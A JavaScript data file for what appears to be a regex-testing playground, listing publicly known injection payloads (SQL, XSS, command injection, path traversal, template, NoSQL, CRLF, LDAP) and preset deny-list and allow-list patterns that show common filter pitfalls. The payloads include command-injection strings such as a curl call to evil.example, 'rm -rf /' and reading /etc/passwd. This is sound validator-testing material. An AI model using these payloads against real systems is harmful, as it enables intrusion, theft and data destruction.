/**
 * Payload library and preset patterns for the Regex Playground.
 *
 * Every payload here is a well-known, publicly documented example of an
 * injection technique (SQLi, XSS, command injection, etc.). They exist so
 * a regex meant to validate or sanitize input can be checked against
 * realistic attack strings — nothing here is novel or weaponized.
 *
 * Fields suffixed with `_pt` hold the Brazilian Portuguese translation of
 * the field with the same name. Regex `pattern`/`flags`/`mode`/`fullMatch`
 * values and payload `value` strings are left untranslated since they're
 * literal regex/wire-format content.
 */

const PAYLOAD_CATEGORIES = [
    {
        id: 'sqli',
        name: 'SQL Injection',
        name_pt: 'SQL Injection',
        description: "Strings that try to break out of a SQL literal or numeric context and change the query's logic.",
        description_pt: 'Strings que tentam escapar de um literal SQL ou de um contexto numérico para alterar a lógica da consulta.',
        payloads: [
            { value: "' OR '1'='1", note: 'Classic boolean bypass for login forms.', note_pt: 'Bypass booleano clássico para formulários de login.' },
            { value: "' OR 1=1 -- ", note: 'Boolean bypass that comments out the rest of the query.', note_pt: 'Bypass booleano que comenta o restante da consulta.' },
            { value: "admin'--", note: 'Comments out the password check entirely.', note_pt: 'Comenta completamente a verificação de senha.' },
            { value: "1' UNION SELECT NULL,NULL,NULL--", note: 'UNION-based extraction from another table.', note_pt: 'Extração baseada em UNION a partir de outra tabela.' },
            { value: "'; DROP TABLE users;--", note: 'Stacked query attempting a destructive statement.', note_pt: 'Consulta empilhada tentando uma instrução destrutiva.' },
            { value: "1' AND SLEEP(5)--", note: 'Time-based blind injection probe.', note_pt: 'Sondagem de injeção cega baseada em tempo.' },
            { value: '" OR ""="', note: 'Double-quote variant of the boolean bypass.', note_pt: 'Variante com aspas duplas do bypass booleano.' },
            { value: '1 OR 1=1', note: 'Works in unquoted numeric contexts.', note_pt: 'Funciona em contextos numéricos sem aspas.' },
        ],
    },
    {
        id: 'xss',
        name: 'Cross-Site Scripting (XSS)',
        name_pt: 'Cross-Site Scripting (XSS)',
        description: 'Markup or URIs that execute attacker-controlled script in the victim\'s browser.',
        description_pt: 'Marcação ou URIs que executam script controlado pelo atacante no navegador da vítima.',
        payloads: [
            { value: '<script>alert(1)</script>', note: 'The textbook reflected/stored XSS payload.', note_pt: 'O payload clássico de XSS refletido/armazenado.' },
            { value: '<img src=x onerror=alert(1)>', note: 'Event-handler based, no <script> tag needed.', note_pt: 'Baseado em event handler, sem necessidade da tag <script>.' },
            { value: '<svg onload=alert(1)>', note: 'SVG event handler, often missed by tag-only filters.', note_pt: 'Event handler de SVG, frequentemente ignorado por filtros que só checam tags.' },
            { value: 'javascript:alert(document.cookie)', note: 'A javascript: URI used in href/src attributes.', note_pt: 'Uma URI javascript: usada em atributos href/src.' },
            { value: '"><script>alert(1)</script>', note: 'Breaks out of an HTML attribute before injecting a tag.', note_pt: 'Escapa de um atributo HTML antes de injetar uma tag.' },
            { value: '<a href="javascript:alert(1)">click</a>', note: 'Link-based javascript: URI execution.', note_pt: 'Execução de URI javascript: por meio de um link.' },
            { value: "'-alert(1)-'", note: 'Breaks out of a single-quoted JS string literal.', note_pt: 'Escapa de um literal de string JS entre aspas simples.' },
            { value: '<iframe src="data:text/html,<script>alert(1)</script>">', note: 'data: URI smuggling a second HTML document.', note_pt: 'URI data: contrabandeando um segundo documento HTML.' },
        ],
    },
    {
        id: 'cmdi',
        name: 'Command Injection',
        name_pt: 'Command Injection',
        description: 'Shell metacharacters used to chain or substitute extra commands onto user input.',
        description_pt: 'Metacaracteres de shell usados para encadear ou substituir comandos extras na entrada do usuário.',
        payloads: [
            { value: '; ls -la', note: 'Command separator appends a second command.', note_pt: 'Separador de comandos anexa um segundo comando.' },
            { value: '| whoami', note: 'Pipes output into / runs an additional command.', note_pt: 'Encaminha a saída para / executa um comando adicional.' },
            { value: '&& cat /etc/passwd', note: 'Runs a follow-up command on success.', note_pt: 'Executa um comando seguinte em caso de sucesso.' },
            { value: '`id`', note: 'Backtick command substitution.', note_pt: 'Substituição de comando com crase.' },
            { value: '$(curl http://evil.example/x)', note: '$() command substitution, often used to exfiltrate data.', note_pt: 'Substituição de comando com $(), frequentemente usada para exfiltrar dados.' },
            { value: '; rm -rf /', note: 'Destructive command appended via separator.', note_pt: 'Comando destrutivo anexado via separador.' },
            { value: '127.0.0.1; shutdown -h now', note: 'Looks like a valid host, hides a second command.', note_pt: 'Parece um host válido, mas esconde um segundo comando.' },
            { value: '|| ping -c 10 127.0.0.1', note: 'Runs a follow-up command on failure.', note_pt: 'Executa um comando seguinte em caso de falha.' },
        ],
    },
    {
        id: 'path',
        name: 'Path Traversal',
        name_pt: 'Path Traversal',
        description: 'Sequences that walk out of an intended directory to reach arbitrary files.',
        description_pt: 'Sequências que saem de um diretório pretendido para alcançar arquivos arbitrários.',
        payloads: [
            { value: '../../../etc/passwd', note: 'Classic relative-path traversal on Unix.', note_pt: 'Travessia clássica de caminho relativo no Unix.' },
            { value: '..\\..\\..\\windows\\system32\\config\\sam', note: 'Windows-style traversal with backslashes.', note_pt: 'Travessia no estilo Windows com barras invertidas.' },
            { value: '%2e%2e%2f%2e%2e%2fetc%2fpasswd', note: 'URL-encoded traversal — bypasses literal "../" filters.', note_pt: 'Travessia codificada em URL — contorna filtros que buscam "../" literal.' },
            { value: '....//....//etc/passwd', note: 'Doubled separators, defeats naive "../" stripping.', note_pt: 'Separadores duplicados, derrota a remoção ingênua de "../".' },
            { value: '/var/www/../../etc/shadow', note: 'Traversal hidden after a plausible base path.', note_pt: 'Travessia escondida após um caminho base plausível.' },
            { value: '..%c0%af..%c0%afetc/passwd', note: 'Overlong UTF-8 encoding of "/" used to evade filters.', note_pt: 'Codificação UTF-8 "overlong" de "/" usada para evadir filtros.' },
        ],
    },
    {
        id: 'ssti',
        name: 'Template Injection (SSTI)',
        name_pt: 'Template Injection (SSTI)',
        description: 'Template syntax that gets evaluated server-side instead of rendered as text.',
        description_pt: 'Sintaxe de template que é avaliada no servidor em vez de renderizada como texto.',
        payloads: [
            { value: '{{7*7}}', note: 'Jinja2 / Twig style expression evaluation probe.', note_pt: 'Sondagem de avaliação de expressão no estilo Jinja2 / Twig.' },
            { value: '${7*7}', note: 'Expression-language / FreeMarker style probe.', note_pt: 'Sondagem no estilo expression-language / FreeMarker.' },
            { value: '#{7*7}', note: 'Ruby ERB / Thymeleaf style probe.', note_pt: 'Sondagem no estilo Ruby ERB / Thymeleaf.' },
            { value: '<%= 7*7 %>', note: 'ERB / JSP style embedded expression.', note_pt: 'Expressão embutida no estilo ERB / JSP.' },
            { value: '{{config.items()}}', note: 'Jinja2 attempt to dump app configuration.', note_pt: 'Tentativa via Jinja2 de extrair a configuração da aplicação.' },
            { value: "${T(java.lang.Runtime).getRuntime().exec('id')}", note: 'Spring EL attempt at remote code execution.', note_pt: 'Tentativa de execução remota de código via Spring EL.' },
        ],
    },
    {
        id: 'nosql',
        name: 'NoSQL Injection',
        name_pt: 'NoSQL Injection',
        description: 'Operators or fragments that change query semantics in document databases.',
        description_pt: 'Operadores ou fragmentos que alteram a semântica de consultas em bancos de dados orientados a documentos.',
        payloads: [
            { value: '{"$gt": ""}', note: "MongoDB operator that matches any value greater than empty string.", note_pt: 'Operador do MongoDB que corresponde a qualquer valor maior que uma string vazia.' },
            { value: '{"$ne": null}', note: "MongoDB operator that matches any non-null value, e.g. for auth bypass.", note_pt: 'Operador do MongoDB que corresponde a qualquer valor não nulo, ex. para bypass de autenticação.' },
            { value: "'; return true; var x='", note: 'Breaks out of a $where JavaScript string into always-true logic.', note_pt: 'Escapa de uma string JavaScript em $where para uma lógica sempre verdadeira.' },
            { value: '{"$where": "this.password.length > 0"}', note: 'Injects arbitrary JS into a $where clause.', note_pt: 'Injeta JS arbitrário em uma cláusula $where.' },
            { value: "admin' || '1'=='1", note: 'Boolean-bypass adapted for JS-style query strings.', note_pt: 'Bypass booleano adaptado para strings de consulta no estilo JS.' },
        ],
    },
    {
        id: 'crlf',
        name: 'CRLF / Header Injection',
        name_pt: 'CRLF / Header Injection',
        description: 'Embedded line breaks that smuggle extra HTTP headers or log entries.',
        description_pt: 'Quebras de linha embutidas que contrabandeiam cabeçalhos HTTP extras ou entradas de log.',
        payloads: [
            { value: '%0d%0aSet-Cookie:%20session=hijacked', note: 'URL-encoded CRLF used to inject a Set-Cookie header.', note_pt: 'CRLF codificado em URL usado para injetar um cabeçalho Set-Cookie.' },
            { value: '\r\nLocation: https://evil.example', note: 'Raw CRLF used for response-splitting / open redirect.', note_pt: 'CRLF puro usado para response-splitting / open redirect.' },
            { value: 'value%0d%0aContent-Length:%200', note: 'Encoded CRLF aimed at smuggling a Content-Length header.', note_pt: 'CRLF codificado visando contrabandear um cabeçalho Content-Length.' },
            { value: 'test\nX-Injected-Header: true', note: 'Bare newline used to inject a header or log line.', note_pt: 'Quebra de linha simples usada para injetar um cabeçalho ou linha de log.' },
        ],
    },
    {
        id: 'ldap',
        name: 'LDAP Injection',
        name_pt: 'LDAP Injection',
        description: 'Filter metacharacters that change the logic of an LDAP search filter.',
        description_pt: 'Metacaracteres de filtro que alteram a lógica de um filtro de busca LDAP.',
        payloads: [
            { value: '*)(uid=*))(|(uid=*', note: 'Closes the current filter clause and ORs in an always-true one.', note_pt: 'Fecha a cláusula de filtro atual e adiciona um OR sempre verdadeiro.' },
            { value: '*)(|(password=*))', note: 'Wildcard combined with an OR to match any password.', note_pt: 'Curinga combinado com um OR para corresponder a qualquer senha.' },
            { value: 'admin)(&)', note: 'Appends an empty AND clause after closing the filter early.', note_pt: 'Anexa uma cláusula AND vazia após fechar o filtro antecipadamente.' },
            { value: '*)(objectClass=*', note: 'Wildcard plus an objectClass filter to enumerate entries.', note_pt: 'Curinga mais um filtro objectClass para enumerar entradas.' },
        ],
    },
];

/**
 * Preset filter patterns. Each one demonstrates either a reasonable
 * approach or a common pitfall, so the same payload library tells a
 * different story depending on which preset is active.
 */
const PRESET_PATTERNS = [
    {
        name: 'Block dangerous characters (deny-list)',
        name_pt: 'Bloquear caracteres perigosos (deny-list)',
        pattern: "[<>'\"; &|$`]",
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: "A broad denylist of characters often used to break out of strings, tags or shell commands. Looks safe — but path traversal and template injection use none of these characters.",
        description_pt: 'Uma deny-list ampla de caracteres frequentemente usados para escapar de strings, tags ou comandos de shell. Parece seguro — mas path traversal e template injection não usam nenhum desses caracteres.',
    },
    {
        name: 'Block SQL keywords (deny-list)',
        name_pt: 'Bloquear palavras-chave SQL (deny-list)',
        pattern: '\\b(select|union|insert|update|delete|drop)\\b|--|;',
        flags: 'i',
        mode: 'deny',
        fullMatch: false,
        description: "Rejects common SQL keywords plus comment markers. Boolean-style payloads like ' OR '1'='1 contain no keyword and no -- or ;, so they slip straight through.",
        description_pt: "Rejeita palavras-chave SQL comuns mais marcadores de comentário. Payloads do tipo booleano como ' OR '1'='1 não contêm nenhuma palavra-chave nem -- ou ;, então passam direto.",
    },
    {
        name: 'Block <script> tags (deny-list)',
        name_pt: 'Bloquear tags <script> (deny-list)',
        pattern: '<\\s*script',
        flags: 'i',
        mode: 'deny',
        fullMatch: false,
        description: 'Catches the obvious <script> tag but completely misses event-handler XSS (onerror, onload) and javascript: URIs.',
        description_pt: 'Pega a tag <script> óbvia, mas ignora completamente XSS via event handler (onerror, onload) e URIs javascript:.',
    },
    {
        name: 'Block shell metacharacters (deny-list)',
        name_pt: 'Bloquear metacaracteres de shell (deny-list)',
        pattern: '[;&|$`<>]',
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: 'A focused denylist for shell metacharacters. Effective against most command-injection payloads, but says nothing about SQL or XSS.',
        description_pt: 'Uma deny-list focada em metacaracteres de shell. Eficaz contra a maioria dos payloads de command injection, mas não diz nada sobre SQL ou XSS.',
    },
    {
        name: 'Reject literal ".." (deny-list)',
        name_pt: 'Rejeitar ".." literal (deny-list)',
        pattern: '\\.\\.',
        flags: '',
        mode: 'deny',
        fullMatch: false,
        description: 'Blocks literal ".." sequences used for path traversal — but URL-encoded variants like %2e%2e%2f never contain a literal ".." and slip through.',
        description_pt: 'Bloqueia sequências ".." literais usadas em path traversal — mas variantes codificadas em URL como %2e%2e%2f nunca contêm ".." literal e passam despercebidas.',
    },
    {
        name: 'Alphanumeric only (allow-list)',
        name_pt: 'Somente alfanumérico (allow-list)',
        pattern: '[A-Za-z0-9]+',
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'A strict allow-list requiring the entire input to be letters and digits. Almost everything in the payload library should be rejected by this.',
        description_pt: 'Uma allow-list estrita que exige que toda a entrada seja composta por letras e dígitos. Quase tudo na biblioteca de payloads deve ser rejeitado por ela.',
    },
    {
        name: 'Email address (allow-list)',
        name_pt: 'Endereço de e-mail (allow-list)',
        pattern: "[\\w.+-]+@[\\w-]+\\.[a-zA-Z]{2,}",
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'A typical email-validation pattern, required to match the whole field.',
        description_pt: 'Um padrão típico de validação de e-mail, que precisa corresponder ao campo inteiro.',
    },
    {
        name: 'Numeric ID only (allow-list)',
        name_pt: 'Somente ID numérico (allow-list)',
        pattern: '\\d+',
        flags: '',
        mode: 'allow',
        fullMatch: true,
        description: 'Strict numeric allow-list, e.g. for a record ID in a URL — every payload in the library should fail this.',
        description_pt: 'Allow-list numérica estrita, ex. para um ID de registro em uma URL — todo payload da biblioteca deve falhar nesse teste.',
    },
];
